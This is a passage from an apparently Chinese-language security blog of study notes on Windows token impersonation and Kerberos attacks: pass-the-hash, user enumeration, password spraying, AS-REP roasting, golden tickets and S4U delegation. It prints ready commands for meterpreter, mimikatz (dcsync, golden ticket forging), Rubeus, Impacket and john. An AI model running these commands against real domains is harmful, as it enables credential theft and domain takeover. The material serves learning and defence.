id="Windows-Access-Token产生过程"><a href="#Windows-Access-Token产生过程" class="headerlink" title="Windows Access Token产生过程"></a>Windows Access Token产生过程</h3><p>每个进程创建时都会根据登录会话权限由LSA(Local Security Authority)分配一个Token(如果CreateProcess时自己指定了 Token, LSA会用该Token， 否则就用父进程Token的一份拷贝。</p><h3 id="Windows-Access-Token令牌假冒实战"><a href="#Windows-Access-Token令牌假冒实战" class="headerlink" title="Windows Access Token令牌假冒实战"></a>Windows Access Token令牌假冒实战</h3><p><strong>当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只有在重启机器后才会清除。</strong></p><p>可以使用多种工具查看目前系统上存在的模拟令牌:</p><ul><li>Incognito</li><li>Powershell - Invoke-TokenManipulation.ps1</li><li>Cobalt Strike - steal_token</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem</span><br><span class="line">meterpreter &gt; load incognito meterpreter &gt; list_tokens –u</span><br><span class="line">Delegation Tokens Available ============================== NT AUTHORITY\LOCAL SERVICENT AUTHORITY\NETWORK SERVICENT AUTHORITY\SYSTEM PAYLOADS\Administrator PAYLOADS\w7</span><br><span class="line">meterpreter &gt; impersonate_token &quot;PAYLOADS\\Administrator”</span><br><span class="line">[+] Delegation token available</span><br><span class="line">[+] Successfully impersonated user PAYLOADS\Administrator</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-23-075028.png"                      alt="image-20230423155028271"                ></p><h3 id="Windows-Access-Token令牌假冒防御"><a href="#Windows-Access-Token令牌假冒防御" class="headerlink" title="Windows Access Token令牌假冒防御"></a>Windows Access Token令牌假冒防御</h3><p>禁止Domain Admins登录对外且未做安全加固的服务器，因为一旦服务器被入侵，域管理员的令牌可能会被攻击者假冒，从控制DC。</p><p>如果想清除假冒令牌，重启服务器即可。</p><h2 id="From-倾旋"><a href="#From-倾旋" class="headerlink" title="From 倾旋"></a>From 倾旋</h2><p>上面的大部分来源于倾旋大佬，跟着大佬学习，我进行了一些图片标注并且部分地方加入了自己的理解。光看大佬们的博客真的不够，很多一样的东西自己写自己理解感觉也是不一样的。下面我会再补充一些其他的，将各路大佬的资料和我自己的内容整合</p><h2 id="Kerberos篇补充"><a href="#Kerberos篇补充" class="headerlink" title="Kerberos篇补充"></a>Kerberos篇补充</h2><h3 id="Kerberos流程再复习"><a href="#Kerberos流程再复习" class="headerlink" title="Kerberos流程再复习"></a>Kerberos流程再复习</h3><p>​    在Kerberos协议中主要是有三个角色的存在：</p><ol><li>访问服务的Client(以下表述为Client 或者用户)</li><li>提供服务的Server(以下表述为服务)</li><li>KDC（Key Distribution Center）密钥分发中心 kerberos 测试工具介绍</li></ol><p>​    其中KDC服务默认会安装在一个域的域控中，而Client和Server为域内的用户或者是服务，如HTTP服务，SQL服务。在Kerberos中Client是否有权限访问Server端的服务由KDC发放的票据来决定。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-23-091548.png"                      alt="image-20230423171548298"                ></p><ol><li><p>AS_REQ: Client向KDC发起AS_REQ,请求凭据是Client hash加密的时间戳</p></li><li><p>AS_REP: KDC使用Client hash进行解密，如果结果正确就返回用krbtgt hash加密的TGT票据，TGT里面包含PAC,PAC包含Client的sid，Client所在的组。</p></li><li><p>TGS_REQ: Client凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求</p></li><li><p>TGS_REP: KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据)</p></li><li><p>AP_REQ: Client拿着TGS票据去请求服务</p></li><li><p>AP_REP: 服务使用自己的hash解密TGS票据。如果解密正确，就拿着PAC去KDC那边问Client有没有访问权限，域控解密PAC。获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有访问服务的权限。</p></li></ol><p>​    注意：这个和上面的详细流程有略微不同哦，因为PAC的原因</p><h3 id="AS-REQ-amp-AS-REP引出的问题"><a href="#AS-REQ-amp-AS-REP引出的问题" class="headerlink" title="AS_REQ &amp; AS_REP引出的问题"></a>AS_REQ &amp; AS_REP引出的问题</h3><h4 id="1-Pass-the-hash"><a href="#1-Pass-the-hash" class="headerlink" title="1. Pass the hash"></a>1. Pass the hash</h4><p>​    上面NTLM的时候讲过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::ekeys</span><br><span class="line">sekurlsa::pth /user:testadmin /domain:test.local /aes256:f74b379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c</span><br></pre></td></tr></table></figure><h4 id="2-用户名枚举"><a href="#2-用户名枚举" class="headerlink" title="2. 用户名枚举"></a>2. 用户名枚举</h4><p>​    当我们在AS_REQ Body里的用户名不正确时，AS_error的回显是不一样的</p><p>​    用户名存在，密码错误的情况下用户名存在，密码错误的情况下：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-030143.png"                      alt="image-20230424110143768"                ></p><p>​    用户名不存在的情况下：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-030234.png"                      alt="image-20230424110234477"                ></p><p>​    工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary/gather/kerberos_enumusers</span><br><span class="line">java –jar kerbguess.jar –r [domain] –d [user list] –s [DC IP]</span><br><span class="line">nmap –p 88 –script-args krb5-enum-users.realm=&#x27;[domain]&#x27;,userdb=[user list] [DC IP]</span><br></pre></td></tr></table></figure><h4 id="3-Password-Spraying"><a href="#3-Password-Spraying" class="headerlink" title="3. Password Spraying"></a>3. Password Spraying</h4><p>​    对密码进行喷洒式的攻击，这个叫法很形象，因为它属于自动化密码猜测的一种。这种针对所有用户的自动密码猜测通常是为了避免帐户被锁定，因为针对同一个用户的连续密码猜测会导致帐户被锁定。所以只有对所有用户同时执行特定的密码登录尝试，才能增加破解的概率，消除帐户被锁定的概率。普通的爆破就是用户名固定，爆破密码，但是密码喷洒，是用固定的密码去跑用户名。</p><p>密码正确：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-031020.png"                      alt="image-20230424111020033"                ></p><p>密码错误：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-031038.png"                      alt="image-20230424111038159"                ></p><h4 id="4-AS-REP-Roasting"><a href="#4-AS-REP-Roasting" class="headerlink" title="4. AS-REP Roasting"></a>4. AS-REP Roasting</h4><p>​    对于域用户，如果设置了选项”Do not require Kerberos preauthentication”，此时向域控制器的88端口发送AS_REQ请求，对收到的AS_REP内容(因为这部分是使用用户hash加密session-key，我们通过进行离线爆破就可以获得用户hash)重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以使用hashcat对其破解，最终获得该用户的明文口令。</p><p>​    <strong>利用前提：域用户设置了选项”Do not require Kerberos preauthentication”。通常情况下，该选项默认不会开启。</strong></p><p>​    如果看过我的语雀或者对域有一定了解，我在这里说明一下后面会讲到的三种攻击方式的区别：</p><p><strong>·</strong>  AS-REP Roasting：获取用户hash然后离线暴力破解</p><p><strong>·</strong>  Kerberoasting：获取应用服务hash然后暴力破解</p><p><strong>·</strong>  黄金票据：通过假冒域中不存在的用户来访问应用服务</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-032139.png"                      alt="image-20230424112139182"                ></p><p>​    在本地系统上，利用下面这条powershell命令，可以很容易遍历出哪些用户开启了“Do not require pre-authentication”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADUser -Filter &#x27;useraccountcontrol -band 4194304&#x27; -Properties useraccountcontrol | Format-Table name</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-032700.png"                      alt="image-20230424112659768"                ></p><p>工具：</p><ol><li><a class="link"   href="https://github.com/GhostPack/Rubeus" >https://github.com/GhostPack/Rubeus<i class="fas fa-external-link-alt"></i></a></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asreproast</span><br></pre></td></tr></table></figure><p>下载完成后，运行上面这条命令，会得到用户账户的hash值，这个key值用于加密时间戳。将这个值保存下来进行离线爆破密码</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-033341.png"                      alt="image-20230424113340885"                ></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asreproast /format:john /outfile: hashes.txt</span><br></pre></td></tr></table></figure><p>这条命令会将提取到的hash值存储到一个txt文件中，存储格式是John这款工具可以破解的格式。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-033449.png"                      alt="image-20230424113448660"                ></p><ol start="2"><li>GetNPUsers.py这个脚本是Impacket工具套件中的其中一个，它可以列举出哪些用户设置了“Do not require Kerberos pre-authentication”，并获得TGTs。同样的，你也可以保存hash到文件中，然后利用John the ripper进行破解，如下图：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python GetNPUsers.py -dc-ip 192.168.1.105 ignite.local/ -usersfile users.txt -format john -outputfile hashes</span><br><span class="line">john –wordlist=/usr/share/wordlists/rockyou.txt hashes</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-033848.png"                      alt="img"                ></p><h4 id="5-黄金票据"><a href="#5-黄金票据" class="headerlink" title="5. 黄金票据"></a>5. 黄金票据</h4><p>​    前面讲过，在AS_REQ &amp; AS_REP中，用户使用自身hash加密时间戳发送给KDC，KDC验证成功后返回用krbtgt hash加密的TGT票据。如果我们有krbtgt的hash，就可以自己给自己签发任意用户的TGT票据。</p><p>​    制作金票需要先导出来krbtgt的hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:test.local /user:krbtgt</span><br></pre></td></tr></table></figure><p>​    然后需要sid和krbtgt的hash，这里生成Golden Ticket不仅可以使用aes256，也可用krbtgt的NTLM hash，可以用mimikatz “lsadump::lsa /patch”导出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:test.local /sid:S-1-5-21-514356739-3204155868-1239341419 /aes256:b4e2924c2d378eda457c2dd3810fdde0a5312354c2b26bc677dfb48e46a17fe7 /user:administrator /ticket:gold.kirbi</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-055538.png"                      alt="image-20230424135537902"                ></p><p>​    然后我们使用这张票据就可以随意在某一台机器上ptt访问dc了。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-055608.png"                      alt="image-20230424135608724"                ></p><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><h5 id="getTGT"><a href="#getTGT" class="headerlink" title="getTGT"></a>getTGT</h5><p>​    给定密码，哈希或aesKey，此脚本将请求TGT并将其保存为ccache。这里面需要注意的是用mimikatz，kekeo，rubeus生成的凭据是以<code>.kirbi</code>后缀的。impacket 生成的凭据的后缀是<code>.ccache</code>。</p><p>​    可以通过<a class="link"   href="https://github.com/rvazarkar/KrbCredExport.git%E9%87%8C%E9%9D%A2%E7%9A%84%E8%84%9A%E6%9C%AC%E8%BD%AC%E5%8C%96%E4%B8%BAkirbi" >https://github.com/rvazarkar/KrbCredExport.git里面的脚本转化为kirbi<i class="fas fa-external-link-alt"></i></a></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-060238.png"                      alt="image-20230424140237311"                ></p><h5 id="GetNPUsers"><a href="#GetNPUsers" class="headerlink" title="GetNPUsers"></a>GetNPUsers</h5><p>​    上面介绍了</p><h5 id="ticketer"><a href="#ticketer" class="headerlink" title="ticketer"></a>ticketer</h5><p>​    该脚本将从零开始或基于模板（从KDC合法请求）创建Golden / Silver票据，允许您自定义PAC_LOGON_INFO结构中设置的一些参数，特别是组，ExtraSids，持续时间等，票据格式是<code>ccache</code>.</p><p>​    首先获取krbtgt的hash首先获取krbtgt的hash</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-060616.png"                      alt="image-20230424140616301"                ></p><p>​    获取域的sid获取域的sid</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-060633.png"                      alt="image-20230424140632981"                ></p><p>​    制作黄金票据制作黄金票据</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-060704.png"                      alt="image-20230424140704064"                ></p><h5 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h5><p>​    上面已介绍</p><h5 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h5><h6 id="kerberos-golden"><a href="#kerberos-golden" class="headerlink" title="kerberos::golden"></a>kerberos::golden</h6><p>mimikatz的kerberos::golden模块可以用于制作黄金票据,票据格式是<code>.kirbi</code></p><p>首先获取krbtgt的hash</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-061001.png"                      alt="image-20230424141001031"                ></p><p>获取域的sid</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-061028.png"                      alt="image-20230424141027830"                ></p><p>制作黄金票据</p><h5 id="DomainPasswordSpray"><a href="#DomainPasswordSpray" class="headerlink" title="DomainPasswordSpray"></a>DomainPasswordSpray</h5><p>​    DomainPasswordSpray是用PowerShell编写的工具，用于对域用户执行密码喷洒攻击。默认情况下，它将利用LDAP从域中导出用户列表，然后扣掉被锁定的用户，再用固定密码进行密码喷洒。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-061200.png"                      alt="image-20230424141200032"                ></p><h3 id="TGS-REQ-amp-TGS-REP"><a href="#TGS-REQ-amp-TGS-REP" class="headerlink" title="TGS_REQ &amp; TGS_REP"></a>TGS_REQ &amp; TGS_REP</h3><p>​    在TGS_REQ &amp; TGS_REP阶段，用户通过AS_REP拿到的TGT票据，去向KDC申请特定服务的访问权限，KDC校验TGT票据，如果校验通过的话，会向用户发送一个TGS票据，之后用户再拿着TGS去访问特定的服务。这一阶段，微软引进了两个扩展S4U2SELF和S4U2PROXY。考虑到这两个扩展是TGS的子协议。</p><p>​    TGS_REQ这个阶段不需要账号密码，需要AS_REP获取到的TGT凭据。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-064312.png"                      alt="image-20230424144311853"                ></p><h4 id="TGS-REQ"><a href="#TGS-REQ" class="headerlink" title="TGS_REQ"></a>TGS_REQ</h4><h5 id="1-msg-type"><a href="#1-msg-type" class="headerlink" title="1. msg-type"></a>1. msg-type</h5><p>​    类型，TGS_REQ对应的就是KRB_TGS_REQ(0x0c)类型。</p><h5 id="2-PA-DATA"><a href="#2-PA-DATA" class="headerlink" title="2. PA-DATA"></a>2. PA-DATA</h5><p>​    正常的TGS_REQ的请求需要用到有</p><p>​    1）AP_REQ</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-064918.png"                      alt="image-20230424144918503"                ></p><p>这个是TGS_REQ必须携带的部分，这部分会携带AS_REP里面获取到的TGT票据，就放在这个结构体里面。</p><p>KDC校验TGT票据，如果票据正确，就返回TGS票据。</p><p>​    2）PA_FPR_USER</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-24-065453.png"                      alt="image-20230424145452156"                ></p><p>类型是S4U2SELF，值是一个唯一的标识符，该标识符指示用户的身份。该唯一标识符由用户名和域名组成。</p><p>S4U2proxy 必须扩展PA_FOR_USER结构，指定服务代表某个用户(图片里面是administrator)去请求针对服务自身的kerberos服务票据。</p><p>​    3） PA_PAC_OPTIONS</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-023109.png"                      alt="image-20230425103109026"                ></p><p>​    类型是PA_PAC_OPTIONS</p><p>​    值是以下flag的组合</p><p>​    – Claims(0)</p><p>​    – Branch Aware(1)</p><p>​    – Forward to Full DC(2)</p><p>​    – Resource-based Constrained Delegation (3)</p><p>​    S4U2proxy 必须扩展PA-PAC-OPTIONS结构。S4U2proxy 必须扩展PA-PAC-OPTIONS结构。</p><p>​    <strong>如果是基于资源的约束委派，就需要指定Resource-based Constrained Delegation位。</strong></p><h5 id="3-REQ-BODY"><a href="#3-REQ-BODY" class="headerlink" title="3. REQ_BODY"></a>3. REQ_BODY</h5><p>1）sname</p><p>这个是要请求的服务，TGS_REP获得的ticket是用该服务用户的hash进行加密的。有个比较有意思的特性是，如果指定的服务是krbtgt，那么拿到的TGS票据是可以当做TGT票据用的。</p><p>2）AddtionTicket</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-023820.png"                      alt="image-20230425103819930"                ></p><p>附加票据，在S4U2proxy请求里面，既需要正常的TGT，也需要S4U2self阶段获取到的TGS，那么这个TGS就添加到AddtionTicket里面。</p><h4 id="TGS-REP"><a href="#TGS-REP" class="headerlink" title="TGS_REP"></a>TGS_REP</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-024847.png"                      alt="image-20230425104847317"                ></p><h5 id="1-msg-type-1"><a href="#1-msg-type-1" class="headerlink" title="1. msg-type"></a>1. msg-type</h5><p>AS_REQ的响应body对应的就是KRB_TGS_REQ(0x0d)</p><h5 id="2-ticket"><a href="#2-ticket" class="headerlink" title="2. ticket"></a>2. ticket</h5><p>这个ticket用于AP_REQ的认证。其中里面的enc_part是加密的，用户不可读取里面的内容。在AS_REQ请求里面是，是使用krbtgt的hash进行加密的，而在TGS_REQ里面是使用要请求的服务的hash加密的。因此如果我们拥有服务的hash就可以自己制作一个ticket，既白银票据。正因为是使用要请求的服务的hash加密的，所以我们可以通过爆破enc_part获得该服务的hash。</p><h5 id="3-Enc-part"><a href="#3-Enc-part" class="headerlink" title="3. Enc_part"></a>3. Enc_part</h5><p>这个enc_part不是ticket里面的enc_part！</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-025438.png"                      alt="image-20230425105438253"                ></p><p>​    这部分是可以解密的，key是上一轮AS_REP里面返回的session_key,也就是导入凭据里面的 session_key，解密后得到encryptionkey，encryptionkey这个结构里面最重要的字段也是session_key(但是这个session_key 不同于上一轮里面的session_key)，用来作为作为下阶段的认证密钥。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-030021.png"                      alt="image-20230425110021441"                ></p><h3 id="S4U2SELF"><a href="#S4U2SELF" class="headerlink" title="S4U2SELF"></a>S4U2SELF</h3><p>​    S4U2self 使得服务可以代表用户获得针对服务自身的kerberos服务票据。这使得服务可以获得用户的授权( 可转发 的用户TGS票据)，然后将其用于后期的认证(主要是后期的s4u2proxy)，这是为了在用户以不使用 Kerberos 的方式对服务进行身份验证的情况下使用。<strong>这里面很重要的一点是服务代表用户获得针对服务自身的kerberos票据这个过程，服务是不需要用户的凭据的</strong></p><p>​    s4u2self的过程如下s4u2self的过程如下</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-031229.png"                      alt="image-20230425111229344"                ></p><p>​    前提条件是服务已经有通过KDC验证的TGT，如下图，需要有TGT。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-031355.png"                      alt="image-20230425111355039"                ></p><p>​    </p><p>​    在步骤1中, 服务(<code>JACKSON-PC$</code>)使用S4U2self扩展名代表用户(<code>administrator</code>)获得针对服务本身(<code>JACKSON-PC$</code>)的服务票证。该服务将填写 PA_FOR_USER 数据结构,类型为<code>S4U2SELF</code>，并将KRB_TGS_REQ消息发送到TGS。 如下图，由于服务<code>JACKSON-PC$</code>代表用户向服务本身(也是<code>JACKSON-PC$</code>)发起请求，因此这里面cname是<code>JACKSON-PC$</code>,sname也是<code>JACKSON-PC$</code></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-031814.png"                      alt="image-20230425111814600"                ></p><p>​    假定TGS支持PA_FOR_USER扩展，则TGS在步骤2中通过KRB_TGS_REP消息返回用户的服务票证。如果服务请求了可转发选项，并且TGS的本地策略允许，则TGS检验通过后必须将<strong>票证标志</strong> 字段设置为可转发，既只要满足：</p><p>​    1）TGT是可以转发的</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-033015.png"                      alt="image-20230425113015078"                ></p><p>​    2）服务配置了约束委派</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-033105.png"                      alt="image-20230425113105376"                ></p><p>3）服务请求了可转发选项</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-033210.png"                      alt="img"                ></p><p>​    则TGS必须将<strong>票证标志</strong> 字段设置为可转发</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-033314.png"                      alt="img"                ></p><p>​    需要注意的是，如果用户的UserAccountControl字段中设置了USER_NOT_DELEGATED位,那么返回的TGS是永远也没法转发的。如图，当Administrator配置了敏感账户，不能被委派，返回的TGS的flag字段没有forwardable。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-033656.png"                      alt="image-20230425113656664"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-033707.png"                      alt="img"                ></p><h3 id="S4U2PROXY"><a href="#S4U2PROXY" class="headerlink" title="S4U2PROXY"></a>S4U2PROXY</h3><p>​    s4u2proxy 使得服务1可以使用来自用户的授权( 在S4U2SELF阶段获得)，然后用该TGS(放在AddtionTicket里面)向KDC请求访问服务2的TGS，并且代表用户访问服务2，而且只能访问服务2。</p><p>​    s4u2proxy的过程如下图所示:</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-034000.png"                      alt="img"                ></p><p>​    在步骤1中，服务1试图代表用户获取服务2的服务票证。服务1发送KRB_TGS_REQ消息，并将用户的服务1服务票证作为 请求中的AddtionTicket。只要满足以下条件：</p><p>1）拥有来自用户的授权( 在S4U2SELF阶段获得的TGS票据)，放在AddtionTicket里面。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-034727.png"                      alt="img"                ></p><p>2）在请求的kdc-options中设置了CNAME-IN-ADDL-TKT标志。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-034929.png"                      alt="img"                ></p><p>3）服务请求了可转发选项</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-034956.png"                      alt="img"                ></p><p>4）服务1 有到服务2的约束委派，将服务2的SPN放在sname里面。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-054520.png"                      alt="img"                ></p><p>如果满足这些条件，则在步骤2中TGS会制作KRB_TGS_REP消息以返回服务票证。可转发标志将在服务票证中设置。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-054545.png"                      alt="img"                ></p><p>​    有个点需要注意的是，前面在S4U2SELF里面提到，在满足一定的条件之后，S4U2SELF返回的票据是可以转发的，这个票据作为S4U2PROXY的AddtionTicket，有些文章里面会说，S4U2PROXY要求AddtionTicket里面的票据一定要是可转发的，否则S4U2PROXY生成的票据是不可以转发的。这个说法在引入可资源约束委派的情况下，是不成立的，下面分情况具体说下。</p><p>1）AddtionTicket里面的票据是可转发的</p><p>如果AddtionTicket里面的票据是可转发的，只要KDC Options里面置forwarable位，那么返回的票据必须置为可转发的</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-062825.png"                      alt="img"                ></p><p>2）AddtionTicket里面的票据是不可转发的</p><p>如果AddtionTicket中的服务票据未设置为可转发的，则KDC必须返回状态为STATUS_NO_MATCH的KRB-ERR-BADOPTION选项。除了一种情况之外，就是配置了服务1到服务2 的基于资源的约束委派，且PA-PAC-OPTION设置了Resource-Based Constrained Delegation标志位(这一例外的前提是S4U2SELF阶段模拟的用户没被设置为对委派敏感，对委派敏感的判断在S4U2SELF阶段，而不是S4U2PROXY阶段)。</p><p>AddtionTicket里面的票据是不可转发的</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-063045.png"                      alt="img"                ></p><p>配置了服务1到服务2 的基于资源的约束委派</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-063103.png"                      alt="img"                ></p><p>PA-PAC-OPTION设置了Resource-Based Constrained Delegation标志位</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-063113.png"                      alt="img"                ></p><p>返回的TGS票据是可转发的</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-063127.png"                      alt="img"                ></p><h3 id="PAC介绍"><a href="#PAC介绍" class="headerlink" title="PAC介绍"></a>PAC介绍</h3><p>​    网上很多版本的kerberos的流程是</p><ol><li><p>用户向KDC发起AS_REQ,请求凭据是用户hash加密的时间戳，KDC使用用户hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据</p></li><li><p>用户凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求，KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据</p></li><li><p>用户拿着TGS票据去请求服务，服务使用自己的hash解密TGS票据。如果解密正确，就允许用户访问。</p></li></ol><p>​    上面这个流程看起来没错，却忽略一个最重要的因素，那就是用户有没有权限访问该服务，在上面的流程里面，只要用户的hash正确，那么就可以拿到TGT，有了TGT，就可以拿到TGS，有了TGS，就可以访问服务，任何一个用户都可以访问任何服务。也就是说上面的流程解决了”Who am i?”的问题，并没有解决 “What can I do?”的问题。</p><p>​    为了解决上面的这个问题，微软引进了PAC，引进PAC之后的kerberos流程变成</p><ol><li>用户向KDC发起AS_REQ,请求凭据是用户hash加密的时间戳，KDC使用用户hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据，<strong>TGT里面包含PAC,PAC包含用户的sid，用户所在的组</strong>。</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-064957.png"                      alt="img"                ></p><ol start="2"><li><p>用户凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求，KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 